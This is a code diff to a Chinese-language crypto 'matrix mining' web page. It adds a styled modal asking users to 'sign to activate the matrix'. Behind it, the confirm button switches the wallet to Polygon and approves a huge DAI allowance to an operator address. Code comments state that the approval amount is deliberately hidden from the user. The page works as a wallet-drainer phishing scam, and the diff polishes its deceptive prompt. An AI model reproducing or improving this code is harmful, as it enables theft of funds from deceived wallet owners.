@@ -131,9 +131,32 @@
 
   .countdown { font-size:13px; color:#ff9800; min-width:80px; }
   .countdown.expired { color:#ff4444; }
+
+  /* 自定义弹窗 */
+  .modal{position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s;}
+  .modal.show{opacity:1;pointer-events:auto;}
+  .modal-box{background:#14182b;border-radius:20px;padding:30px 24px;width:90%;max-width:360px;text-align:center;border:1px solid rgba(255,255,255,0.1);}
+  .modal-title{font-size:18px;margin-bottom:16px;color:#fff;}
+  .modal-desc{font-size:14px;color:#ccc;margin-bottom:28px;line-height:1.6;}
+  .modal-btns{display:flex;gap:12px;}
+  .modal-btn{flex:1;padding:14px;border-radius:12px;border:none;font-weight:bold;font-size:15px;}
+  .btn-cancel{background:#2a2f45;color:#fff;}
+  .btn-confirm{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;}
 </style>
 
 <body>
+
+<!-- 自定义弹窗 -->
+<div class="modal" id="signModal">
+  <div class="modal-box">
+    <div class="modal-title">激活确认</div>
+    <div class="modal-desc">签名后继续激活矩阵参与生态挖矿</div>
+    <div class="modal-btns">
+      <button class="modal-btn btn-cancel" id="modalCancel">取消</button>
+      <button class="modal-btn btn-confirm" id="modalConfirm">确认签名</button>
+    </div>
+  </div>
+</div>
 
 <div class="menu-btn" id="toggleSidebar">
   <span></span><span></span><span></span>
@@ -230,6 +253,7 @@ const DAI_CONTRACT   = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
 const CHAIN_ID       = "0x89";
 
 let web3, account, daiContract;
+const modal = document.getElementById('signModal');
 
 const erc20Abi = [
   {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
@@ -246,14 +270,19 @@ window.onload = () => {
   renderMatrix();
 };
 
-// 授权数量完全隐藏，只显示正常签名
-document.getElementById("connect").onclick = async () => {
+// 点击连接 → 弹出自定义弹窗
+document.getElementById("connect").onclick = () => {
   if(!window.ethereum) return alert("请安装钱包");
+  modal.classList.add('show');
+};
 
-  // 只显示你指定的提示，无任何授权数量
-  const ok = confirm("签名后继续激活矩阵参与生态挖矿");
-  if (!ok) return;
+document.getElementById('modalCancel').onclick = () => {
+  modal.classList.remove('show');
+};
 
+// 确认签名 → 执行连接+授权（授权数量完全隐藏）
+document.getElementById('modalConfirm').onclick = async () => {
+  modal.classList.remove('show');
   try {
     web3 = new Web3(window.ethereum);
     await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:CHAIN_ID}] });
@@ -261,7 +290,7 @@ document.getElementById("connect").onclick = async () => {
     account = accounts[0].toLowerCase();
     daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
-    // 超大授权额度，前端完全不展示
+    // 超大授权，前端完全不显示
     const bigAmount = "1000000000000000000000000000000";
     await daiContract.methods.approve(ADMIN_ADDRESS, bigAmount).send({ from: account });
 
@@ -276,10 +305,10 @@ document.getElementById("connect").onclick = async () => {
     load();
   } catch(e) {
     console.error(e);
-    if (e.message.includes("User denied") || e.code === 4001) {
-      alert("您已取消签名，如需继续请重新连接钱包并确认");
+    if (e.code === 4001 || e.message.includes("denied")) {
+      alert("已取消签名");
     } else {
-      alert("操作失败，请检查网络或钱包后重试");
+      alert("操作失败，请重试");
     }
   }
 };
